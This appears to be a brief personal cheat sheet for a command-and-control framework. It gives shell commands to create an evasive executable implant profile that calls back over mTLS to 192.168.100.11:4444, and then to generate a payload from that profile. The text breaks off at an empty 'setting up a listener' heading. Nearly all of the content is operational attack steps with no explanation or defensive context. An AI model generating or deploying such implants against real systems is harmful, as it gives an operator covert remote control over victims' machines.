#c2 

create a profile:
```bash
profiles new -e -f exe --mtls "mtls://192.168.100.11:4444"
```

create a payload with this profile:
```bash
profiles generate mtls
```

setting up a listener:
